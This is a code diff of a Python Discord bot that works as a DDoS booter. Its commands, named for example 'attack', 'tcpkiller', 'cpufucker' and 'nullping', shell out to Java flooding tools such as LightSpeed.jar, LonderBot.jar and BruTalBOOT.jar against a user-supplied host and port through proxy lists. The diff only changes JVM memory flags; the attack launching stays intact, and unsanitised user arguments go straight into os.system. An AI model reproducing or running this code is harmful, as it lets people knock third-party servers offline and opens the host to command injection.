@@ -194,7 +194,7 @@ async def posss(ctx, arg1):
 async def attack(ctx, arg1, arg2, arg3):
     def attack():
             os.system(
-                f"java -Xmx14384M -jar mcstorm2.jar {arg1} {arg2} {arg3} 120 -1")
+                f"java -Xms4096M -Xmx4096M -Dterminal.jline=false -Dterminal.ansi=true -XX:+UseG1GC -XX:+ParallelRefProcEnabled -XX:MaxGCPauseMillis=200 -XX:+UnlockExperimentalVMOptions -XX:+DisableExplicitGC -XX:+AlwaysPreTouch -XX:G1HeapWastePercent=5 -XX:G1MixedGCCountTarget=4 -XX:G1MixedGCLiveThresholdPercent=90 -XX:G1RSetUpdatingPauseTimePercent=5 -XX:SurvivorRatio=32 -XX:+PerfDisableSharedMem -XX:MaxTenuringThreshold=1 -XX:G1NewSizePercent=30 -XX:G1MaxNewSizePercent=40 -XX:G1HeapRegionSize=8M -XX:G1ReservePercent=20 -XX:InitiatingHeapOccupancyPercent=15 -Dusing.aikars.flags=https://mcflags.emc.gs -Daikars.new.flags=true -jar  mcstorm2.jar {arg1} {arg2} {arg3} 120 -1")
             os.system(f"")
     embed = discord.Embed(title=f'>> ***ATTACK SENT SUCCESSFULLY*** <<', color=random.choice(colors) , timestamp= ctx.message.created_at)
     embed.add_field(name=f'[𝗧𝗔𝗥𝗚𝗘𝗧]: ``{arg1}``', inline=False, value=f'**[𝗣𝗥𝗢𝗧𝗢𝗖𝗢𝗟]**: ``{arg2}``')
@@ -281,7 +281,7 @@ async def storm(ctx, arg1, arg2):
         pass
     else:
         def attack():
-            os.system(f"java -jar LightSpeed.jar {arg1} 1000 proxies.txt 1 {arg2} 60 100 800 10")
+            os.system(f"java -Xms4096M -Xmx4096M -Dterminal.jline=false -Dterminal.ansi=true -XX:+UseG1GC -XX:+ParallelRefProcEnabled -XX:MaxGCPauseMillis=200 -XX:+UnlockExperimentalVMOptions -XX:+DisableExplicitGC -XX:+AlwaysPreTouch -XX:G1HeapWastePercent=5 -XX:G1MixedGCCountTarget=4 -XX:G1MixedGCLiveThresholdPercent=90 -XX:G1RSetUpdatingPauseTimePercent=5 -XX:SurvivorRatio=32 -XX:+PerfDisableSharedMem -XX:MaxTenuringThreshold=1 -XX:G1NewSizePercent=30 -XX:G1MaxNewSizePercent=40 -XX:G1HeapRegionSize=8M -XX:G1ReservePercent=20 -XX:InitiatingHeapOccupancyPercent=15 -Dusing.aikars.flags=https://mcflags.emc.gs -Daikars.new.flags=true -jar  LightSpeed.jar {arg1} 1000 proxies.txt 1 {arg2} 60 100 800 10")
             os.system(f"")
 
         embed = discord.Embed(title='>> ***ATTACK SENT SUCCESSFULLY*** <<', color=random.choice(colors) , timestamp= ctx.message.created_at)
@@ -307,7 +307,7 @@ async def tcpkiller(ctx, arg1, arg2):
         pass
     else:
         def attack():
-            os.system(f"java -jar LightSpeed.jar {arg1} 1000 proxies.txt 2 {arg2} 60 100 800 10")
+            os.system(f"java -Xms4096M -Xmx4096M -Dterminal.jline=false -Dterminal.ansi=true -XX:+UseG1GC -XX:+ParallelRefProcEnabled -XX:MaxGCPauseMillis=200 -XX:+UnlockExperimentalVMOptions -XX:+DisableExplicitGC -XX:+AlwaysPreTouch -XX:G1HeapWastePercent=5 -XX:G1MixedGCCountTarget=4 -XX:G1MixedGCLiveThresholdPercent=90 -XX:G1RSetUpdatingPauseTimePercent=5 -XX:SurvivorRatio=32 -XX:+PerfDisableSharedMem -XX:MaxTenuringThreshold=1 -XX:G1NewSizePercent=30 -XX:G1MaxNewSizePercent=40 -XX:G1HeapRegionSize=8M -XX:G1ReservePercent=20 -XX:InitiatingHeapOccupancyPercent=15 -Dusing.aikars.flags=https://mcflags.emc.gs -Daikars.new.flags=true -jar  LightSpeed.jar {arg1} 1000 proxies.txt 2 {arg2} 60 100 800 10")
             os.system(f"")
 
         embed = discord.Embed(title='>> ***ATTACK SENT SUCCESSFULLY*** <<', color=random.choice(colors) , timestamp= ctx.message.created_at)
@@ -333,7 +333,7 @@ async def brutalcpu(ctx, arg1, arg2):
         pass
     else:
         def attack():
-            os.system(f"java -jar LightSpeed.jar {arg1} 1000 proxies.txt 14 {arg2} 60 100 800 10")
+            os.system(f"java -Xms4096M -Xmx4096M -Dterminal.jline=false -Dterminal.ansi=true -XX:+UseG1GC -XX:+ParallelRefProcEnabled -XX:MaxGCPauseMillis=200 -XX:+UnlockExperimentalVMOptions -XX:+DisableExplicitGC -XX:+AlwaysPreTouch -XX:G1HeapWastePercent=5 -XX:G1MixedGCCountTarget=4 -XX:G1MixedGCLiveThresholdPercent=90 -XX:G1RSetUpdatingPauseTimePercent=5 -XX:SurvivorRatio=32 -XX:+PerfDisableSharedMem -XX:MaxTenuringThreshold=1 -XX:G1NewSizePercent=30 -XX:G1MaxNewSizePercent=40 -XX:G1HeapRegionSize=8M -XX:G1ReservePercent=20 -XX:InitiatingHeapOccupancyPercent=15 -Dusing.aikars.flags=https://mcflags.emc.gs -Daikars.new.flags=true -jar  LightSpeed.jar {arg1} 1000 proxies.txt 14 {arg2} 60 100 800 10")
             os.system(f"")
 
         embed = discord.Embed(title='>> ***ATTACK SENT SUCCESSFULLY*** <<', color=random.choice(colors) , timestamp= ctx.message.created_at)
@@ -361,7 +361,7 @@ async def cpufucker(ctx, arg1, arg2):
         pass
     else:
         def attack():
-            os.system(f"java -jar LightSpeed.jar {arg1} 1000 proxies.txt 15 {arg2} 60 100 800 10")
+            os.system(f"java -Xms4096M -Xmx4096M -Dterminal.jline=false -Dterminal.ansi=true -XX:+UseG1GC -XX:+ParallelRefProcEnabled -XX:MaxGCPauseMillis=200 -XX:+UnlockExperimentalVMOptions -XX:+DisableExplicitGC -XX:+AlwaysPreTouch -XX:G1HeapWastePercent=5 -XX:G1MixedGCCountTarget=4 -XX:G1MixedGCLiveThresholdPercent=90 -XX:G1RSetUpdatingPauseTimePercent=5 -XX:SurvivorRatio=32 -XX:+PerfDisableSharedMem -XX:MaxTenuringThreshold=1 -XX:G1NewSizePercent=30 -XX:G1MaxNewSizePercent=40 -XX:G1HeapRegionSize=8M -XX:G1ReservePercent=20 -XX:InitiatingHeapOccupancyPercent=15 -Dusing.aikars.flags=https://mcflags.emc.gs -Daikars.new.flags=true -jar  LightSpeed.jar {arg1} 1000 proxies.txt 15 {arg2} 60 100 800 10")
             os.system(f"")
 
         embed = discord.Embed(title='>> ***ATTACK SENT SUCCESSFULLY*** <<', color=random.choice(colors) , timestamp= ctx.message.created_at)
@@ -397,7 +397,7 @@ async def nullping(ctx, arg1, arg2):
         pass
     else:
         def attack():
-            os.system(f"java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -Dr=false -Dlen=25555 -jar nettybooter.jar {arg1} 6 90000 {arg2} 60 proxies.txt socks4")
+            os.system(f"java -Xms4096M -Xmx4096M -Dterminal.jline=false -Dterminal.ansi=true -XX:+UseG1GC -XX:+ParallelRefProcEnabled -XX:MaxGCPauseMillis=200 -XX:+UnlockExperimentalVMOptions -XX:+DisableExplicitGC -XX:+AlwaysPreTouch -XX:G1HeapWastePercent=5 -XX:G1MixedGCCountTarget=4 -XX:G1MixedGCLiveThresholdPercent=90 -XX:G1RSetUpdatingPauseTimePercent=5 -XX:SurvivorRatio=32 -XX:+PerfDisableSharedMem -XX:MaxTenuringThreshold=1 -XX:G1NewSizePercent=30 -XX:G1MaxNewSizePercent=40 -XX:G1HeapRegionSize=8M -XX:G1ReservePercent=20 -XX:InitiatingHeapOccupancyPercent=15 -Dusing.aikars.flags=https://mcflags.emc.gs -Daikars.new.flags=true -jar nettybooter.jar {arg1} 6 90000 {arg2} 60 proxies.txt socks4")
             os.system(f"")
 
         embed = discord.Embed(title='>> ***ATTACK SENT SUCCESSFULLY*** <<',color=random.choice(colors) , timestamp= ctx.message.created_at)
@@ -426,7 +426,7 @@ async def abdeluxe(ctx, arg1, arg2, arg3):
         pass
     else:
         def attack():
-            os.system(f"java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar DropBotv9-beta_obf.jar host={arg1} port={arg2} pfile=proxies.txt threads=90000 time=60 method=antibotdeluxe version={arg3} license=123ascqweq11")
+            os.system(f"java -Xms4096M -Xmx4096M -Dterminal.jline=false -Dterminal.ansi=true -XX:+UseG1GC -XX:+ParallelRefProcEnabled -XX:MaxGCPauseMillis=200 -XX:+UnlockExperimentalVMOptions -XX:+DisableExplicitGC -XX:+AlwaysPreTouch -XX:G1HeapWastePercent=5 -XX:G1MixedGCCountTarget=4 -XX:G1MixedGCLiveThresholdPercent=90 -XX:G1RSetUpdatingPauseTimePercent=5 -XX:SurvivorRatio=32 -XX:+PerfDisableSharedMem -XX:MaxTenuringThreshold=1 -XX:G1NewSizePercent=30 -XX:G1MaxNewSizePercent=40 -XX:G1HeapRegionSize=8M -XX:G1ReservePercent=20 -XX:InitiatingHeapOccupancyPercent=15 -Dusing.aikars.flags=https://mcflags.emc.gs -Daikars.new.flags=true -jar  DropBotv9-beta_obf.jar host={arg1} port={arg2} pfile=proxies.txt threads=90000 time=60 method=antibotdeluxe version={arg3} license=123ascqweq11")
             os.system(f"")
 
         embed = discord.Embed(title='>> ***ATTACK SENT SUCCESSFULLY*** <<',color=random.choice(colors) , timestamp= ctx.message.created_at)
@@ -453,7 +453,7 @@ async def flamecord(ctx, arg1, arg2, arg3):
         pass
     else:
         def attack():
-            os.system(f"java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar DropBotv9-beta_obf.jar host={arg1} port={arg2} pfile=proxies.txt threads=10000 method=flamecord version={arg3} license=123ascqweq11")
+            os.system(f"java -Xms4096M -Xmx4096M -Dterminal.jline=false -Dterminal.ansi=true -XX:+UseG1GC -XX:+ParallelRefProcEnabled -XX:MaxGCPauseMillis=200 -XX:+UnlockExperimentalVMOptions -XX:+DisableExplicitGC -XX:+AlwaysPreTouch -XX:G1HeapWastePercent=5 -XX:G1MixedGCCountTarget=4 -XX:G1MixedGCLiveThresholdPercent=90 -XX:G1RSetUpdatingPauseTimePercent=5 -XX:SurvivorRatio=32 -XX:+PerfDisableSharedMem -XX:MaxTenuringThreshold=1 -XX:G1NewSizePercent=30 -XX:G1MaxNewSizePercent=40 -XX:G1HeapRegionSize=8M -XX:G1ReservePercent=20 -XX:InitiatingHeapOccupancyPercent=15 -Dusing.aikars.flags=https://mcflags.emc.gs -Daikars.new.flags=true -jar  DropBotv9-beta_obf.jar host={arg1} port={arg2} pfile=proxies.txt threads=10000 method=flamecord version={arg3} license=123ascqweq11")
             os.system(f"")
 
         embed = discord.Embed(title='>> ***ATTACK SENT SUCCESSFULLY*** <<',color=random.choice(colors) , timestamp= ctx.message.created_at)
@@ -488,7 +488,7 @@ async def rameater(ctx, arg1, arg2):
         pass
     else:
         def attack():
-            os.system(f"java -jar LonderBot.jar {arg1} 12 10000 {arg2} 60 proxies.txt socks4")
+            os.system(f"java -Xms4096M -Xmx4096M -Dterminal.jline=false -Dterminal.ansi=true -XX:+UseG1GC -XX:+ParallelRefProcEnabled -XX:MaxGCPauseMillis=200 -XX:+UnlockExperimentalVMOptions -XX:+DisableExplicitGC -XX:+AlwaysPreTouch -XX:G1HeapWastePercent=5 -XX:G1MixedGCCountTarget=4 -XX:G1MixedGCLiveThresholdPercent=90 -XX:G1RSetUpdatingPauseTimePercent=5 -XX:SurvivorRatio=32 -XX:+PerfDisableSharedMem -XX:MaxTenuringThreshold=1 -XX:G1NewSizePercent=30 -XX:G1MaxNewSizePercent=40 -XX:G1HeapRegionSize=8M -XX:G1ReservePercent=20 -XX:InitiatingHeapOccupancyPercent=15 -Dusing.aikars.flags=https://mcflags.emc.gs -Daikars.new.flags=true -jar  LonderBot.jar {arg1} 12 10000 {arg2} 60 proxies.txt socks4")
             os.system(f"")
 
         embed = discord.Embed(title='>> ***ATTACK SENT SUCCESSFULLY*** <<',color=random.choice(colors) , timestamp= ctx.message.created_at)
@@ -517,7 +517,7 @@ async def byte(ctx, arg1, arg2):
         pass
     else:
         def attack():
-            os.system(f"java -jar LonderBot.jar {arg1} 7 10000 {arg2} 60 proxies.txt socks4")
+            os.system(f"java -Xms4096M -Xmx4096M -Dterminal.jline=false -Dterminal.ansi=true -XX:+UseG1GC -XX:+ParallelRefProcEnabled -XX:MaxGCPauseMillis=200 -XX:+UnlockExperimentalVMOptions -XX:+DisableExplicitGC -XX:+AlwaysPreTouch -XX:G1HeapWastePercent=5 -XX:G1MixedGCCountTarget=4 -XX:G1MixedGCLiveThresholdPercent=90 -XX:G1RSetUpdatingPauseTimePercent=5 -XX:SurvivorRatio=32 -XX:+PerfDisableSharedMem -XX:MaxTenuringThreshold=1 -XX:G1NewSizePercent=30 -XX:G1MaxNewSizePercent=40 -XX:G1HeapRegionSize=8M -XX:G1ReservePercent=20 -XX:InitiatingHeapOccupancyPercent=15 -Dusing.aikars.flags=https://mcflags.emc.gs -Daikars.new.flags=true -jar  LonderBot.jar {arg1} 7 10000 {arg2} 60 proxies.txt socks4")
             os.system(f"")
 
         embed = discord.Embed(title='>> ***ATTACK SENT SUCCESSFULLY*** <<',color=random.choice(colors) , timestamp= ctx.message.created_at)
@@ -545,7 +545,7 @@ async def aegis(ctx, arg1, arg2):
         pass
     else:
         def attack():
-            os.system(f"java -jar LonderBot.jar {arg1} 15 10000 {arg2} 60 proxies.txt socks4")
+            os.system(f"java -Xms4096M -Xmx4096M -Dterminal.jline=false -Dterminal.ansi=true -XX:+UseG1GC -XX:+ParallelRefProcEnabled -XX:MaxGCPauseMillis=200 -XX:+UnlockExperimentalVMOptions -XX:+DisableExplicitGC -XX:+AlwaysPreTouch -XX:G1HeapWastePercent=5 -XX:G1MixedGCCountTarget=4 -XX:G1MixedGCLiveThresholdPercent=90 -XX:G1RSetUpdatingPauseTimePercent=5 -XX:SurvivorRatio=32 -XX:+PerfDisableSharedMem -XX:MaxTenuringThreshold=1 -XX:G1NewSizePercent=30 -XX:G1MaxNewSizePercent=40 -XX:G1HeapRegionSize=8M -XX:G1ReservePercent=20 -XX:InitiatingHeapOccupancyPercent=15 -Dusing.aikars.flags=https://mcflags.emc.gs -Daikars.new.flags=true -jar  LonderBot.jar {arg1} 15 10000 {arg2} 60 proxies.txt socks4")
             os.system(f"")
 
         embed = discord.Embed(title='>> ***ATTACK SENT SUCCESSFULLY*** <<',color=random.choice(colors) , timestamp= ctx.message.created_at)
@@ -572,7 +572,7 @@ async def cpudowner(ctx, arg1, arg2):
         pass
     else:
         def attack():
-            os.system(f"java -jar BruTalBOOT.jar {arg1} 16 1 {arg2} 60 100 60 100 10 proxies.txt socks4")
+            os.system(f"java -Xms4096M -Xmx4096M -Dterminal.jline=false -Dterminal.ansi=true -XX:+UseG1GC -XX:+ParallelRefProcEnabled -XX:MaxGCPauseMillis=200 -XX:+UnlockExperimentalVMOptions -XX:+DisableExplicitGC -XX:+AlwaysPreTouch -XX:G1HeapWastePercent=5 -XX:G1MixedGCCountTarget=4 -XX:G1MixedGCLiveThresholdPercent=90 -XX:G1RSetUpdatingPauseTimePercent=5 -XX:SurvivorRatio=32 -XX:+PerfDisableSharedMem -XX:MaxTenuringThreshold=1 -XX:G1NewSizePercent=30 -XX:G1MaxNewSizePercent=40 -XX:G1HeapRegionSize=8M -XX:G1ReservePercent=20 -XX:InitiatingHeapOccupancyPercent=15 -Dusing.aikars.flags=https://mcflags.emc.gs -Daikars.new.flags=true -jar  BruTalBOOT.jar {arg1} 16 1 {arg2} 60 100 60 100 10 proxies.txt socks4")
             os.system(f"")
 
         embed = discord.Embed(title='>> ***ATTACK SENT SUCCESSFULLY*** <<',color=random.choice(colors) , timestamp= ctx.message.created_at)
@@ -598,7 +598,7 @@ async def ultimatekiller(ctx, arg1, arg2):
         pass
     else:
         def attack():
-            os.system(f"java -jar BruTalBOOT.jar {arg1} 14 1 {arg2} 60 100 60 100 10 proxies.txt socks4")
+            os.system(f"java -Xms4096M -Xmx4096M -Dterminal.jline=false -Dterminal.ansi=true -XX:+UseG1GC -XX:+ParallelRefProcEnabled -XX:MaxGCPauseMillis=200 -XX:+UnlockExperimentalVMOptions -XX:+DisableExplicitGC -XX:+AlwaysPreTouch -XX:G1HeapWastePercent=5 -XX:G1MixedGCCountTarget=4 -XX:G1MixedGCLiveThresholdPercent=90 -XX:G1RSetUpdatingPauseTimePercent=5 -XX:SurvivorRatio=32 -XX:+PerfDisableSharedMem -XX:MaxTenuringThreshold=1 -XX:G1NewSizePercent=30 -XX:G1MaxNewSizePercent=40 -XX:G1HeapRegionSize=8M -XX:G1ReservePercent=20 -XX:InitiatingHeapOccupancyPercent=15 -Dusing.aikars.flags=https://mcflags.emc.gs -Daikars.new.flags=true -jar  BruTalBOOT.jar {arg1} 14 1 {arg2} 60 100 60 100 10 proxies.txt socks4")
             os.system(f"")
 
         embed = discord.Embed(title='>> ***ATTACK SENT SUCCESSFULLY*** <<',color=random.choice(colors) , timestamp= ctx.message.created_at)
@@ -624,7 +624,7 @@ async def extremekiller(ctx, arg1, arg2):
         pass
     else:
         def attack():
-            os.system(f"java -jar BruTalBOOT.jar {arg1} 15 1 {arg2} 60 100 60 100 10 proxies.txt socks4")
+            os.system(f"java -Xms4096M -Xmx4096M -Dterminal.jline=false -Dterminal.ansi=true -XX:+UseG1GC -XX:+ParallelRefProcEnabled -XX:MaxGCPauseMillis=200 -XX:+UnlockExperimentalVMOptions -XX:+DisableExplicitGC -XX:+AlwaysPreTouch -XX:G1HeapWastePercent=5 -XX:G1MixedGCCountTarget=4 -XX:G1MixedGCLiveThresholdPercent=90 -XX:G1RSetUpdatingPauseTimePercent=5 -XX:SurvivorRatio=32 -XX:+PerfDisableSharedMem -XX:MaxTenuringThreshold=1 -XX:G1NewSizePercent=30 -XX:G1MaxNewSizePercent=40 -XX:G1HeapRegionSize=8M -XX:G1ReservePercent=20 -XX:InitiatingHeapOccupancyPercent=15 -Dusing.aikars.flags=https://mcflags.emc.gs -Daikars.new.flags=true -jar  BruTalBOOT.jar {arg1} 15 1 {arg2} 60 100 60 100 10 proxies.txt socks4")
             os.system(f"")
 
         embed = discord.Embed(title='>> ***ATTACK SENT SUCCESSFULLY*** <<',color=random.choice(colors) , timestamp= ctx.message.created_at)
@@ -650,7 +650,7 @@ async def bypasshub(ctx, arg1, arg2):
         pass
     else:
         def attack():
-            os.system(f"java -jar BruTalBOOT.jar {arg1} 13 1 {arg2} 60 100 60 100 10 proxies.txt socks4")
+            os.system(f"java -Xms4096M -Xmx4096M -Dterminal.jline=false -Dterminal.ansi=true -XX:+UseG1GC -XX:+ParallelRefProcEnabled -XX:MaxGCPauseMillis=200 -XX:+UnlockExperimentalVMOptions -XX:+DisableExplicitGC -XX:+AlwaysPreTouch -XX:G1HeapWastePercent=5 -XX:G1MixedGCCountTarget=4 -XX:G1MixedGCLiveThresholdPercent=90 -XX:G1RSetUpdatingPauseTimePercent=5 -XX:SurvivorRatio=32 -XX:+PerfDisableSharedMem -XX:MaxTenuringThreshold=1 -XX:G1NewSizePercent=30 -XX:G1MaxNewSizePercent=40 -XX:G1HeapRegionSize=8M -XX:G1ReservePercent=20 -XX:InitiatingHeapOccupancyPercent=15 -Dusing.aikars.flags=https://mcflags.emc.gs -Daikars.new.flags=true -jar  BruTalBOOT.jar {arg1} 13 1 {arg2} 60 100 60 100 10 proxies.txt socks4")
             os.system(f"")
 
         embed = discord.Embed(title='>> ***ATTACK SENT SUCCESSFULLY*** <<',color=random.choice(colors) , timestamp= ctx.message.created_at)
@@ -676,7 +676,7 @@ async def spammer(ctx, arg1, arg2):
         pass
     else:
         def attack():
-            os.system(f"java -jar BruTalBOOT.jar {arg1} 29 1 {arg2} 60 100 60 100 10 proxies.txt socks4")
+            os.system(f"java -Xms4096M -Xmx4096M -Dterminal.jline=false -Dterminal.ansi=true -XX:+UseG1GC -XX:+ParallelRefProcEnabled -XX:MaxGCPauseMillis=200 -XX:+UnlockExperimentalVMOptions -XX:+DisableExplicitGC -XX:+AlwaysPreTouch -XX:G1HeapWastePercent=5 -XX:G1MixedGCCountTarget=4 -XX:G1MixedGCLiveThresholdPercent=90 -XX:G1RSetUpdatingPauseTimePercent=5 -XX:SurvivorRatio=32 -XX:+PerfDisableSharedMem -XX:MaxTenuringThreshold=1 -XX:G1NewSizePercent=30 -XX:G1MaxNewSizePercent=40 -XX:G1HeapRegionSize=8M -XX:G1ReservePercent=20 -XX:InitiatingHeapOccupancyPercent=15 -Dusing.aikars.flags=https://mcflags.emc.gs -Daikars.new.flags=true -jar  BruTalBOOT.jar {arg1} 29 1 {arg2} 60 100 60 100 10 proxies.txt socks4")
             os.system(f"")
 
         embed = discord.Embed(title='>> ***ATTACK SENT SUCCESSFULLY*** <<',color=random.choice(colors) , timestamp= ctx.message.created_at)
@@ -704,7 +704,7 @@ async def waterbum(ctx, arg1, arg2):
         pass
     else:
         def attack():
-            os.system(f"java -jar LonderBot.jar {arg1} 16 100000 {arg2} 60 proxies.txt socks4")
+            os.system(f"java -Xms4096M -Xmx4096M -Dterminal.jline=false -Dterminal.ansi=true -XX:+UseG1GC -XX:+ParallelRefProcEnabled -XX:MaxGCPauseMillis=200 -XX:+UnlockExperimentalVMOptions -XX:+DisableExplicitGC -XX:+AlwaysPreTouch -XX:G1HeapWastePercent=5 -XX:G1MixedGCCountTarget=4 -XX:G1MixedGCLiveThresholdPercent=90 -XX:G1RSetUpdatingPauseTimePercent=5 -XX:SurvivorRatio=32 -XX:+PerfDisableSharedMem -XX:MaxTenuringThreshold=1 -XX:G1NewSizePercent=30 -XX:G1MaxNewSizePercent=40 -XX:G1HeapRegionSize=8M -XX:G1ReservePercent=20 -XX:InitiatingHeapOccupancyPercent=15 -Dusing.aikars.flags=https://mcflags.emc.gs -Daikars.new.flags=true -jar  LonderBot.jar {arg1} 16 100000 {arg2} 60 proxies.txt socks4")
             os.system(f"")
 
         embed = discord.Embed(title='>> ***ATTACK SENT SUCCESSFULLY*** <<',color=random.choice(colors) , timestamp= ctx.message.created_at)
@@ -730,7 +730,7 @@ async def cpup(ctx, arg1, arg2):
         pass
     else:
         def attack():
-            os.system(f"java -jar LonderBot.jar {arg1} 18 100000 {arg2} 60 proxies.txt socks4")
+            os.system(f"java -Xms4096M -Xmx4096M -Dterminal.jline=false -Dterminal.ansi=true -XX:+UseG1GC -XX:+ParallelRefProcEnabled -XX:MaxGCPauseMillis=200 -XX:+UnlockExperimentalVMOptions -XX:+DisableExplicitGC -XX:+AlwaysPreTouch -XX:G1HeapWastePercent=5 -XX:G1MixedGCCountTarget=4 -XX:G1MixedGCLiveThresholdPercent=90 -XX:G1RSetUpdatingPauseTimePercent=5 -XX:SurvivorRatio=32 -XX:+PerfDisableSharedMem -XX:MaxTenuringThreshold=1 -XX:G1NewSizePercent=30 -XX:G1MaxNewSizePercent=40 -XX:G1HeapRegionSize=8M -XX:G1ReservePercent=20 -XX:InitiatingHeapOccupancyPercent=15 -Dusing.aikars.flags=https://mcflags.emc.gs -Daikars.new.flags=true -jar  LonderBot.jar {arg1} 18 100000 {arg2} 60 proxies.txt socks4")
             os.system(f"")
 
         embed = discord.Embed(title='>> ***ATTACK SENT SUCCESSFULLY*** <<',color=random.choice(colors) , timestamp= ctx.message.created_at)
@@ -758,7 +758,7 @@ async def emotialdamage(ctx, arg1, arg2):
         pass
     else:
         def attack():
-            os.system(f"java -jar LonderBot.jar {arg1} 11 100000 {arg2} 60 proxies.txt socks4")
+            os.system(f"java -Xms4096M -Xmx4096M -Dterminal.jline=false -Dterminal.ansi=true -XX:+UseG1GC -XX:+ParallelRefProcEnabled -XX:MaxGCPauseMillis=200 -XX:+UnlockExperimentalVMOptions -XX:+DisableExplicitGC -XX:+AlwaysPreTouch -XX:G1HeapWastePercent=5 -XX:G1MixedGCCountTarget=4 -XX:G1MixedGCLiveThresholdPercent=90 -XX:G1RSetUpdatingPauseTimePercent=5 -XX:SurvivorRatio=32 -XX:+PerfDisableSharedMem -XX:MaxTenuringThreshold=1 -XX:G1NewSizePercent=30 -XX:G1MaxNewSizePercent=40 -XX:G1HeapRegionSize=8M -XX:G1ReservePercent=20 -XX:InitiatingHeapOccupancyPercent=15 -Dusing.aikars.flags=https://mcflags.emc.gs -Daikars.new.flags=true -jar  LonderBot.jar {arg1} 11 100000 {arg2} 60 proxies.txt socks4")
             os.system(f"")
 
         embed = discord.Embed(title='>> ***ATTACK SENT SUCCESSFULLY*** <<',color=random.choice(colors) , timestamp= ctx.message.created_at)
@@ -785,7 +785,7 @@ async def downshield(ctx, arg1, arg2):
         pass
     else:
         def attack():
-            os.system(f"java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar LegitBootV8.jar {arg1} 2 35 {arg2} 60 proxies.txt socks4")
+            os.system(f"java -Xms4096M -Xmx4096M -Dterminal.jline=false -Dterminal.ansi=true -XX:+UseG1GC -XX:+ParallelRefProcEnabled -XX:MaxGCPauseMillis=200 -XX:+UnlockExperimentalVMOptions -XX:+DisableExplicitGC -XX:+AlwaysPreTouch -XX:G1HeapWastePercent=5 -XX:G1MixedGCCountTarget=4 -XX:G1MixedGCLiveThresholdPercent=90 -XX:G1RSetUpdatingPauseTimePercent=5 -XX:SurvivorRatio=32 -XX:+PerfDisableSharedMem -XX:MaxTenuringThreshold=1 -XX:G1NewSizePercent=30 -XX:G1MaxNewSizePercent=40 -XX:G1HeapRegionSize=8M -XX:G1ReservePercent=20 -XX:InitiatingHeapOccupancyPercent=15 -Dusing.aikars.flags=https://mcflags.emc.gs -Daikars.new.flags=true -jar  LegitBootV8.jar {arg1} 2 35 {arg2} 60 proxies.txt socks4")
             os.system(f"")
 
         embed = discord.Embed(title='>> ***ATTACK SENT SUCCESSFULLY*** <<',color=random.choice(colors) , timestamp= ctx.message.created_at)
